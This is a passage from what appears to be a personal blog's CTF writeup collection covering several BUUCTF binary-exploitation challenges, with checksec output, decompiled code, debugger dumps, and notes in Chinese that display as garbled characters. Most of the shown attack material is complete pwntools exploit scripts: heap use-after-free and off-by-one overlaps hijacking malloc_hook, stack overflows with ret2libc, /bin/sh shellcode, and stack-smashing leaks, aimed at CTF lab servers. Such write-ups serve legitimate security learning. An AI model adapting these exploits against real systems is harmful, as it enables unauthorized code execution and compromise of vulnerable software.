0x00000019 0x0860b038 0x616161610x860b020: 0x61616161 0x61616161 0x00000000 0x000000110x860b030: 0x0804862b 0x0804a018 0x00000000 0x000000190x860b040: 0x00000000 0x61616161 0x61616161 0x616161610x860b050: 0x00000000 0x00020fb1 0x00000000 0x00000000 5.EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *import structp = 0def add(size, content): p.sendlineafter(&quot;Your choice :&quot;, &quot;1&quot;) p.recvuntil(&quot;Note size :&quot;) p.sendline(str(size)) p.recvuntil(&quot;Content :&quot;) p.sendline(content)def delete(index): p.sendlineafter(&quot;Your choice :&quot;, &quot;2&quot;) p.recvuntil(&quot;Index :&quot;) p.sendline(str(index)) def show(index): p.sendlineafter(&quot;Your choice :&quot;, &quot;3&quot;) p.recvuntil(&quot;Index :&quot;) p.sendline(str(index))def pwn(ip,port,mode,debug): elf = ELF(&quot;./hacknote&quot;) libc = ELF(&quot;/home/joe1sn/libc/32/libc-2.23.so&quot;) global p if debug == 1: context.log_level = &quot;debug&quot; else: pass if mode == 0: p = process(&quot;./hacknote&quot;) else: p = remote(ip,port) add(0x10,&#x27;a&#x27;*0x10) #note0 add(0x10,&#x27;a&#x27;*0x10) #note1 delete(1) delete(0) fun_addr=0x0804862B add(8,p32(fun_addr)+p32(elf.got[&quot;free&quot;])) show(1) leak=u32(p.recv(4)) libc_base = leak-libc.sym[&quot;free&quot;] sys_addr = libc_base+libc.sym[&quot;system&quot;] success(&#x27;leak addr: &#x27;+hex(leak)) success(&#x27;libc base: &#x27;+hex(libc_base)) success(&#x27;system addr &#x27;+hex(sys_addr)) delete(2) #add(8,p32(sys_addr)+&#x27;;sh;&#x27;) add(8,p32(sys_addr)+&#x27;||sh&#x27;) show(1) p.interactive()if __name__ == &#x27;__main__&#x27;: pwn(&quot;node3.buuoj.cn&quot;,28478,1,0) pwnable_start 1.checksec 12345Arch: i386-32-littleRELRO: No RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000) 2.IDA 123456789101112131415161718192021222324252627; =============== S U B R O U T I N E ======================================= public _start _start proc near ; DATA XREF: LOAD:08048018â†‘o push esp push offset _exit xor eax, eax xor ebx, ebx xor ecx, ecx xor edx, edx push &#x27;:FTC&#x27; push &#x27; eht&#x27; push &#x27; tra&#x27; push &#x27;ts s&#x27; push 2774654Ch mov ecx, esp ; addr mov dl, 20 ; len mov bl, 1 ; fd mov al, 4 ; syscall(write) int 80h ; LINUX - sys_write xor ebx, ebx ; ebxæ¸…é›¶ mov dl, 60 ; len mov al, 3 ; syscall(read) int 80h ; LINUX - add esp, 14h retn.text:0804809C _start endp ; sp-analysis failed 1.å‘addrç©ºé—´å†™å…¥&quot;Letâ€™s start the CTF:&quot;; 2.è°ƒç”¨readå‡½æ•°ï¼Œè¿™é‡Œæœ‰ä¸ªæ ˆæº¢å‡ºï¼Œæº¢å‡ºåè¿”å›addrï¼› 3.è¿”å›åå‘addrå†™å…¥shellcodeï¼› 4.æœ€åæº¢å‡º+æŠ¬æ ˆ+shellcodeã€‚ 3.EXP 1234567891011121314from pwn import *context.log_level = &quot;debug&quot;p = process(&#x27;./start&#x27;)p = remote(&quot;node3.buuoj.cn&quot;,27809)payload = &#x27;a&#x27;*20 + p32(0x08048087)p.recvuntil(&#x27;:&#x27;)p.send(payload)print(payload)leak=u32(p.recv(4));print(leak)shellcode= &#x27;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#x27;payload= &#x27;a&#x27;*20 + p32(leak+20)+shellcodep.send(payload)p.interactive() pwnable_orw 1.checksec 123456Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 2.IDA main 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; orw_seccomp(); printf(&quot;Give my your shellcode:&quot;); read(0, &amp;shellcode, 0xC8u); ((void (*)(void))shellcode)(); return 0;&#125; ç›´æ¥ä¼ å…¥shellcodeè¿‡åï¼Œæ‰§è¡Œshellcode 3.EXP 1234567891011from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26098)shellcode = shellcraft.open(&#x27;/flag&#x27;)shellcode += shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,100)shellcode += shellcraft.write(1,&#x27;esp&#x27;,100)shellcode = asm(shellcode)p.recvuntil(&quot;Give my your shellcode:&quot;)p.sendline(shellcode)p.interactive() roarctf_2019_easy_pwn 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 2.IDA å››ä¸ªåŠŸèƒ½ï¼šå¢åˆ æŸ¥æ”¹ 123456789101112131415161718192021def add(size): p.recvuntil(&#x27;choice: &#x27;) p.sendline(&#x27;1&#x27;) p.recvuntil(&#x27;size:&#x27;) p.sendline(str(size))def edit(index,size,data): p.sendlineafter(&quot;: &quot;,&#x27;2&#x27;) p.sendlineafter(&quot;: &quot;,str(index)) p.sendlineafter(&quot;: &quot;,str(size)) p.recvuntil(&#x27;content:&#x27;) p.send(data)def free(index): p.sendlineafter(&quot;: &quot;,&#x27;3&#x27;) p.recvuntil(&#x27;index:&#x27;) p.sendline(str(index))def show(index): p.sendlineafter(&quot;: &quot;,&#x27;4&#x27;) p.sendlineafter(&quot;: &quot;,str(index)) edit 123456789101112131415if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 15 )&#123; v2 = *((_DWORD *)&amp;unk_202040 + 4 * v2); if ( v2 == 1 ) &#123; printf(&quot;size: &quot;); v2 = read_input(1); v4 = vuln(*((_DWORD *)&amp;unk_202044 + 4 * v3), v2);// off by one if ( v2 &gt; 0 ) &#123; printf(&quot;content: &quot;, (unsigned int)v2); v2 = sub_D92(qword_202048[2 * v3], v4); &#125; &#125;&#125; off by oneæ¼æ´,å¯¼è‡´æˆ‘ä»¬ä¸ªå·²è¦†ç›–ä¸‹ä¸€ä¸ªå †å—çš„sizeåŸŸï¼Œä»è€Œå®ç°chunk overlapping 3.GDB 12345678910111213141516171819202122232425262728#code add(0x18)#0 add(0x18)#1 add(0x88)#2 add(0x88)#3 add(0x28)#4 add(0x28)#5 add(0x68)#6 edit(0,0x18+10,&#x27;a&#x27;*0x18+&#x27;\\xb1&#x27;)#off by one #1.szie=0x18 2.size=0x98 #1.size+2.size=chunk_add.size=0xb0 # 0x10+8 like this is more conviente to use # not to add sth like p64(0) gdb.attach(p)#GDBpwndbg&gt; x/32gx 0x55a813ab90000x55a813ab9000: 0x0000000000000000 0x00000000000000210x55a813ab9010: 0x6161616161616161 0x61616161616161610x55a813ab9020: 0x6161616161616161 0x00000000000000b1 è¿™é‡Œå·²ç»è¢«ä¿®æ”¹ä¸º&#x27;\\xb1&#x27;0x55a813ab9030: 0x0000000000000000 0x00000000000000000x55a813ab9040: 0x0000000000000000 0x00000000000000910x55a813ab9050: 0x0000000000000000 0x00000000000000000x55a813ab9060: 0x0000000000000000 0x0000000000000000&gt;è¿™æ ·æˆ‘ä»¬free(1)ï¼Œå°±ä¼šå¾—åˆ°`libc base`äº† 12345678910111213141516171819202122232425262728293031#code free(1) add(0xa8)#1 #gdb.attach(p) edit(1,0x20,&#x27;a&#x27;*0x18+p64(0x91))#repair #gdb.attach(p) free(2) show(1) #leak gdb.attach(p)#GDBpwndbg&gt; binfastbins.........unsortedbinall: 0x55d9d3909040 â€”â–¸ 0x7ff8d0bbab78 (main_arena+88) â—‚â€” 0x55d9d3909040..........pwndbg&gt; x/32gx 0x55d9d39090000x55d9d3909000: 0x0000000000000000 0x00000000000000210x55d9d3909010: 0x6161616161616161 0x61616161616161610x55d9d3909020: 0x6161616161616161 0x00000000000000b10x55d9d3909030: 0x6161616161616161 0x61616161616161610x55d9d3909040: 0x6161616161616161 0x00000000000000910x55d9d3909050: 0x00007ff8d0bbab78 0x00007ff8d0bbab780x55d9d3909060: 0x0000000000000000 0x00000000000000000x55d9d3909070: 0x0000000000000000 0x0000000000000000&gt;å†è¾“å‡ºchunk1çš„å†…å®¹å°±å¯ä»¥è¾“å‡º`0x00007ff8d0bbab78`,ä»è€Œæ³„éœ²`libc base`æœ€åè¾“å‡º[+] libc base=&gt;0x7ff8d07f6000[+] malloc hook=&gt;0x7ff8d0bbab10[+] realloc hook=&gt;0x7ff8d087a6c0[+] one gadget=&gt;0x7ff8d083b26a 1234567891011121314151617181920212223242526272829303132è¿™é‡Œæˆ‘ä»¬ç”¨çš„one_gadgetæ˜¯0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULLæ‰€ä»¥éœ€è¦æ»¡è¶³æ¡ä»¶[rsp+0x30] == NULL,è¿™å°±éœ€è¦reallocæ¥å¯¹æ ˆä¸Šçš„ä¸œè¥¿è¿›è¡Œå¾®è°ƒ#code edit(4,0x32,&#x27;a&#x27;*0x28+&#x27;\\xa1&#x27;) #off by one #gdb.attach(p) free(5) free(6) add(0x98)#2 edit(2,0x38,&#x27;a&#x27;*0x28+p64(0x71)+p64(malloc_hook-0x23)) #new 2 take the 5&#x27;s place and hijack 6 to malloc hook #gdb.attach(p) add(0x68)#5 add(0x68)#6 in malloc hook edit(6,27,&#x27;a&#x27;*(0x13-8)+p64(one_gadget)+p64(realloc)) gdb.attach(p)&gt;ä¿®æ”¹realloc_hookä¸ºonegadgetï¼Œä¿®æ”¹malloc_hookä¸ºrealloc+åç§»åœ°å€#GDB&gt;æ–­ç‚¹è¿‡åèµ°å‡ ä¸ªå•æ­¥pwndbg&gt; x/16gx $rsp+0x300x7ffeb950d680: 0x0000000000000000 0x00007f5695fa773b0x7ffeb950d690: 0x00007ffeb950d8db 0x00007f56961d99a00x7ffeb950d6a0: 0x0000000000000000 0x00000000000000000x7ffeb950d6b0: 0x0000000000000000 0x00007f5695fa773b0x7ffeb950d6c0: 0x0000000000000000 0x00007ffeb950dd580x7ffeb950d6d0: 0x0000000000000000 0x00000000000000000x7ffeb950d6e0: 0x0000000000000000 0x00007ffeb950d8f00x7ffeb950d6f0: 0x0000000000000064 0x0000004000000000&gt; è°ƒç”¨äº†è¿‡åå°±è¾¾æˆäº† 4.EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./roarctf_2019_easy_pwn&quot;)libc=ELF(&#x27;/home/joe1sn/libc/64/libc-2.23.so&#x27;)p = process(&quot;./roarctf_2019_easy_pwn&quot;)def add(size): p.recvuntil(&#x27;choice: &#x27;) p.sendline(&#x27;1&#x27;) p.recvuntil(&#x27;size:&#x27;) p.sendline(str(size))def edit(index,size,data): p.sendlineafter(&quot;: &quot;,&#x27;2&#x27;) p.sendlineafter(&quot;: &quot;,str(index)) p.sendlineafter(&quot;: &quot;,str(size)) p.recvuntil(&#x27;content:&#x27;) p.send(data)def free(index): p.sendlineafter(&quot;: &quot;,&#x27;3&#x27;) p.recvuntil(&#x27;index:&#x27;) p.sendline(str(index))def show(index): p.sendlineafter(&quot;: &quot;,&#x27;4&#x27;) p.sendlineafter(&quot;: &quot;,str(index)) if __name__ == &#x27;__main__&#x27;: add(0x18)#0 add(0x18)#1 add(0x88)#2 add(0x88)#3 add(0x28)#4 add(0x28)#5 add(0x68)#6 edit(0,0x18+10,&#x27;a&#x27;*0x18+&#x27;\\xb1&#x27;)#off by one #1.szie=0x18 2.size=0x98 #1.size+2.size=chunk_add.size=0xb0 # 0x10+8 like this is more conviente to use # not to add sth like p64(0) #gdb.attach(p) free(1) add(0xa8)#1 #gdb.attach(p) edit(1,0x20,&#x27;a&#x27;*0x18+p64(0x91))#repair #gdb.attach(p) free(2) show(1) #leak #gdb.attach(p) p.recvuntil(&#x27;content: &#x27;) libc_base=u64(p.recvuntil(&quot;\\x7f\\x00\\x00&quot;)[-8:])-0x3c4b78 print(hex(libc_base)) malloc_hook=libc_base+libc.sym[&#x27;__malloc_hook&#x27;] realloc = libc_base + libc.symbols[&#x27;__libc_realloc&#x27;] one_gadget=libc_base+0x4526a log.success(&quot;libc base=&gt;0x%x&quot;,libc_base) log.success(&quot;malloc hook=&gt;0x%x&quot;,malloc_hook) log.success(&quot;realloc hook=&gt;0x%x&quot;,realloc) log.success(&quot;one gadget=&gt;0x%x&quot;,one_gadget) &#x27;&#x27;&#x27; add(0x28)#4 add(0x28)#5 add(0x68)#6 &#x27;&#x27;&#x27; edit(4,0x32,&#x27;a&#x27;*0x28+&#x27;\\xa1&#x27;) #off by one #gdb.attach(p) free(5) free(6) add(0x98)#2 edit(2,0x38,&#x27;a&#x27;*0x28+p64(0x71)+p64(malloc_hook-0x23)) #new 2 take the 5&#x27;s place and hijack 6 to malloc hook #gdb.attach(p) add(0x68)#5 add(0x68)#6 in malloc hook edit(6,27,&#x27;a&#x27;*(0x13-8)+p64(one_gadget)+p64(realloc)) gdb.attach(p) add(0x10) p.interactive() rip 1.checksec 123456Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x400000)RWX: Has RWX segments 2.IDA main 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [rsp+1h] [rbp-Fh] puts(&quot;please input&quot;); gets(&amp;s, argv); puts(&amp;s); puts(&quot;ok,bye!!!&quot;); return 0;&#125; string 123456789101112LOAD:00000000004002A8 0000001C C /lib64/ld-linux-x86-64.so.2LOAD:00000000004003B9 0000000A C libc.so.6LOAD:00000000004003C3 00000005 C getsLOAD:00000000004003C8 00000005 C putsLOAD:00000000004003CD 00000007 C systemLOAD:00000000004003D4 00000012 C __libc_start_mainLOAD:00000000004003E6 0000000C C GLIBC_2.2.5LOAD:00000000004003F2 0000000F C __gmon_start__.rodata:0000000000402004 0000000D C please input.rodata:0000000000402011 0000000A C ok,bye!!!.rodata:000000000040201B 00000008 C /bin/sh.eh_frame:00000000004020DF 00000006 C ;*3$\\&quot; getså‡½æ•°æ¼æ´ï¼Œæœ‰/bin/sh 3.EXP 1234567from pwn import *#context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,27035)binsh_addr = 0x401186payload = &#x27;\\x00&#x27;*0xf + p64(binsh_addr)p.sendline(payload)p.interactive() warmup_csaw_2016 1.checksec 123456Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x400000)RWX: Has RWX segments 2.IDA main 123456789101112__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char s; // [rsp+0h] [rbp-80h] char v5; // [rsp+40h] [rbp-40h] write(1, &quot;-Warm Up-\\n&quot;, 0xAuLL); write(1, &quot;WOW:&quot;, 4uLL); sprintf(&amp;s, &quot;%p\\n&quot;, sub_40060D); write(1, &amp;s, 9uLL); write(1, &quot;&gt;&quot;, 1uLL); return gets(&amp;v5, &quot;&gt;&quot;);&#125; string 12345678910111213LOAD:0000000000400238 0000001C C /lib64/ld-linux-x86-64.so.2LOAD:0000000000400361 0000000A C libc.so.6LOAD:000000000040036B 00000005 C getsLOAD:0000000000400370 00000008 C sprintfLOAD:0000000000400378 00000007 C systemLOAD:000000000040037F 00000012 C __libc_start_mainLOAD:0000000000400391 00000006 C writeLOAD:0000000000400397 0000000F C __gmon_start__LOAD:00000000004003A6 0000000C C GLIBC_2.2.5.rodata:0000000000400734 0000000D C cat flag.txt.rodata:0000000000400741 0000000B C -Warm Up-\\n.rodata:000000000040074C 00000005 C WOW:.eh_frame:00000000004007FF 00000006 C ;*3$\\&quot; getsæº¢å‡ºï¼Œsystemå‡½æ•°å’Œcat flagå­—ç¬¦ä¸² 3.EXP 12345678910from pwn import *#context.log_level = &#x27;debug&#x27;p = remote(&quot;node3.buuoj.cn&quot;,28792)cat_flag = 0x40060dpayload = &#x27;\\x00&#x27;*(0x40+8) + p64(cat_flag)p.sendlineafter(&quot;&gt;&quot;,payload)print p.recv()p.interactive() wdb2018_guess ä¸€é“æ€è·¯æ¸…å¥‡çš„é¢˜ checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) åæ±‡ç¼– å¯ä»¥çœ‹å‡º **1.**flagæ–‡ä»¶è¢«è¯»å–åˆ°äº†æ ˆä¸Šé¢ **2.**ä¸»ç¨‹åºåˆ›å»º(fork)äº†ä¸‰ä¸ªçº¿ç¨‹ **3.**åœ¨è¿™ä¸ªçº¿ç¨‹é‡Œé¢ï¼Œç¨‹åºå°†æˆ‘ä»¬çš„è¾“å…¥å’Œç«™ä¸Šé¢çš„flagè¿›è¡Œæ¯”è¾ƒ **4.**æˆ‘ä»¬è¾“å…¥çš„æ—¶å€™è°ƒç”¨äº†getsï¼Œå¯¼è‡´æ ˆæº¢å‡º GDBè°ƒè¯• 1. è¾“å…¥åï¼Œåœ¨strcmpæ–­ç‚¹ æˆ‘ä»¬æº¢å‡º0x128å°±å¯ä»¥è¦†ç›– _libc_arg[0] çš„å€¼ï¼Œä»è€Œæ³„éœ²æ•°æ® 2. æ‰¾åˆ°flagçš„å†…å­˜ä½ç½® è¿™ä¸ªæˆ‘ä»¬å¯ä»¥ä»ç¯å¢ƒå˜é‡å…¥æ‰‹ï¼Œæ‰¾åˆ°_libc_environï¼Œç„¶åå†æ ¹æ®ç›¸å¯¹åç§»æ‰¾åˆ°flagåœ¨æ ˆä¸Šçš„åœ°å€ çŸ¥è¯†ç‚¹ ç¨‹åºå¼€å¯äº†canaryä¿æŠ¤ï¼Œè¿™é‡Œæœ‰ä¸ªä¹‹å‰æˆ‘å¿½ç•¥çš„ç‚¹ canaryçš„æ£€æŸ¥æŠ¥é”™ æºç å¦‚ä¸‹ 1234567891011void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (&quot;stack smashing detected&quot;);&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) &#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, &quot;*** %s ***: %s terminated\\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125; ç¨‹åºè¾“å‡ºçš„æ—¶å€™ä½¿ç”¨äº† __libc_argv[0] æ¥æ‰“å°ç¨‹åºçš„åç§°ï¼Œæ‰€ä»¥å°±å¯ä»¥ä»è¿™é‡Œæ³„éœ²ä¸€äº›ä¿¡æ¯ è¿™é‡Œæ‹“å±•ä¸€ä¸‹ argcï¼šå‘½ä»¤çš„æ¡æ•° argv[]ï¼šè¾“å…¥çš„æ¯æ¡å‘½ä»¤ 1234567891011#include &lt;iostream&gt;using std::cout;using std::cin;using std::endl;int main(int argc, char *argv[])&#123; for (int i = 0; i &lt; argc; ++i) cout&lt;&lt;argv[i]&lt;&lt;endl; return 0;&#125; è¾“å‡º é‚£ä¹ˆargv[0]=ç¨‹åºçš„åç§°(ä¹Ÿæ˜¯ç¬¬0æ¡æŒ‡ä»¤) _libc_environ åœ¨libcä¸­ä¿å­˜äº†ä¸€ä¸ªå‡½æ•°å«_environï¼Œå­˜çš„æ˜¯å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ å¦‚ä½•ä»libcåœ°å€å¾—åˆ°æ ˆåœ°å€è¿™é‡Œé¢å°±è¯¦ç»†å†™äº†è¿™ä¸ªå‡½æ•° æ”»å‡»æ­¥éª¤ 1. æ³„éœ²libc 2. æ³„éœ²_libc_argçš„è¡¨å¤´ environï¼Œä»è€Œæ‰¾åˆ°flagåœ¨ç«™ä¸Šé¢çš„åœ°å€ 3. è¦†ç›– **libc_arg[0]**ä¸ºflagåœ¨æ ˆä¸Šé¢çš„åœ°å€ï¼Œæœ€åé€šè¿‡ stack_smashing æ³„éœ²å‡ºflag EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *name = &quot;guess&quot;elf = ELF(name)# libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)# libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)libc = ELF(&quot;libc-2.23.so&quot;)sh = 0def main(ip,port,debug,mode): global sh if debug==0: context.log_level = &quot;debug&quot; else: pass if mode==0: sh = process(name) else: sh = remote(ip,port) payload = &quot;A&quot;*0x128 payload += p64(elf.got[&quot;read&quot;]) sh.sendlineafter(&quot;Please type your guessing flag\\n&quot;,payload) sh.recvuntil(&#x27;stack smashing detected ***: &#x27;) libc_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))-libc.sym[&quot;read&quot;] system = libc_base + libc.sym[&quot;system&quot;] environ = libc_base+libc.sym[&#x27;__environ&#x27;] info(&quot;libc base -&gt; &quot;+hex(libc_base)) info(&quot;libc_system -&gt; &quot;+hex(system)) info(&quot;__libc_environ -&gt; &quot;+hex(environ)) payload = &quot;A&quot;*0x128 payload += p64(environ) sh.sendlineafter(&quot;Please type your guessing flag\\n&quot;,payload) en_list = u64(sh.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,&#x27;\\x00&#x27;)) info(&quot;environ -&gt; &quot;+hex(en_list)) payload=&quot;A&quot;*0x128 payload += p64(en_list-0x168) sh.sendlineafter(&quot;Please type your guessing flag\\n&quot;,payload) sh.recvuntil(&quot;*** stack smashing detected ***: &quot;) print sh.recvline()if __name__ == &#x27;__main__&#x27;: main(&quot;node3.buuoj.cn&quot;,&quot;26263&quot;,1,1) xdctf2015_pwn200 EXP 1234567891011121314151617181920212223242526272829303132333435from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./bof&quot;)#p = process(&quot;./bof&quot;)p = remote(&quot;node3.buuoj.cn&quot;,27377)write_got = elf.got[&quot;write&quot;]write_plt = elf.plt[&quot;write&quot;]main = elf.sym[&quot;main&quot;]payload = &#x27;a&#x27;*(0x6c+4)payload += p32(write_plt)+p32(main)payload += p32(1)+p32(write_got)+p32(4)p.recvuntil(&quot;Welcome to XDCTF2015~!\\n&quot;)p.sendline(payload)leak_addr = u32(p.recvuntil(&#x27;\\xf7&#x27;)[-4:])libc = LibcSearcher(&quot;write&quot;,leak_addr)base = leak_addr-libc.dump(&quot;write&quot;)sys_addr = base+libc.dump(&quot;system&quot;)binsh = base+libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc base=&gt;%x&quot;,base)log.success(&quot;system addr=&gt;%x&quot;,sys_addr)log.success(&quot;binsh=&gt;%x&quot;,binsh)p.recvuntil(&quot;Welcome to XDCTF2015~!\\n&quot;)payload = &#x27;a&#x27;*(0x6c+4)payload += p32(sys_addr)+p32(main)payload += p32(binsh)p.sendline(payload)p.interactive() é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA vulnerable_function 123456ssize_t vulnerable_function()&#123; char buf; // [esp+10h] [ebp-88h] return read(0, &amp;buf, 0x100u);&#125; æº¢å‡º+libc leak 3.EXP 1234567891011121314151617181920212223242526272829303132from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26402)elf = ELF(&quot;./2018_rop&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)read_plt = elf.plt[&quot;read&quot;]read_got = elf.got[&quot;read&quot;]write_plt = elf.plt[&quot;write&quot;]write_got = elf.got[&quot;write&quot;]main_addr = elf.sym[&quot;main&quot;]payload = &quot;a&quot;*(0x88+4)payload += p32(write_plt)+p32(main_addr)payload += p32(1)+p32(write_got)+p32(4)p.sendline(payload)leak_addr = u32(p.recv(4))libc_base = leak_addr - libc.sym[&quot;write&quot;]sys_addr = libc_base + libc.sym[&quot;system&quot;]binsh = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()log.info(&quot;libc base=&gt;%x&quot;,libc_base)log.info(&quot;system addr=&gt;%x&quot;,sys_addr)log.info(&quot;/bin/sh addr=&gt;%x&quot;,binsh)payload = &#x27;a&#x27;*(0x88+4)payload += p32(sys_addr)+p32(main_addr)payload += p32(binsh)p.sendline(payload)p.interactive()","categories":[{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/categories/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/tags/writeup/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://joe1sn.eu.org/tags/BUUCTF/"}]}],"categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"},{"name":"hardware","slug":"hardware","permalink":"https://joe1sn.eu.org/categories/hardware/"},{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"},{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/categories/writeup/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"},{"name":"os","slug":"notes/os","permalink":"https://joe1sn.eu.org/categories/notes/os/"},{"name":"misc","slug":"misc","permalink":"https://joe1sn.eu.org/categories/misc/"},{"name":"pentest","slug":"pentest","permalink":"https://joe1sn.eu.org/categories/pentest/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"},{"name":"cve","slug":"cve","permalink":"https://joe1sn.eu.org/tags/cve/"},{"name":"æ¼æ´æŒ–æ˜","slug":"æ¼æ´æŒ–æ˜","permalink":"https://joe1sn.eu.org/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"stm32","slug":"stm32","permalink":"https://joe1sn.eu.org/tags/stm32/"},{"name":"source","slug":"source","permalink":"https://joe1sn.eu.org/tags/source/"},{"name":"AFL","slug":"AFL","permalink":"https://joe1sn.eu.org/tags/AFL/"},{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"},{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"C","slug":"C","permalink":"https://joe1sn.eu.org/tags/C/"},{"name":"CTF","slug":"CTF","permalink":"https://joe1sn.eu.org/tags/CTF/"},{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/tags/writeup/"},{"name":"cpp","slug":"cpp","permalink":"https://joe1sn.eu.org/tags/cpp/"},{"name":"muud","slug":"muud","permalink":"https://joe1sn.eu.org/tags/muud/"},{"name":"web framework","slug":"web-framework","permalink":"https://joe1sn.eu.org/tags/web-framework/"},{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/tags/notes/"},{"name":"git","slug":"git","permalink":"https://joe1sn.eu.org/tags/git/"},{"name":"os","slug":"os","permalink":"https://joe1sn.eu.org/tags/os/"},{"name":"misc","slug":"misc","permalink":"https://joe1sn.eu.org/tags/misc/"},{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://joe1sn.eu.org/tags/%E6%B8%97%E9%80%8F/"},{"name":"dbg","slug":"dbg","permalink":"https://joe1sn.eu.org/tags/dbg/"},{"name":"Windows","slug":"Windows","permalink":"https://joe1sn.eu.org/tags/Windows/"},{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://joe1sn.eu.org/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"spring","slug":"spring","permalink":"https://joe1sn.eu.org/tags/spring/"},{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://joe1sn.eu.org/tags/BUUCTF/"}]}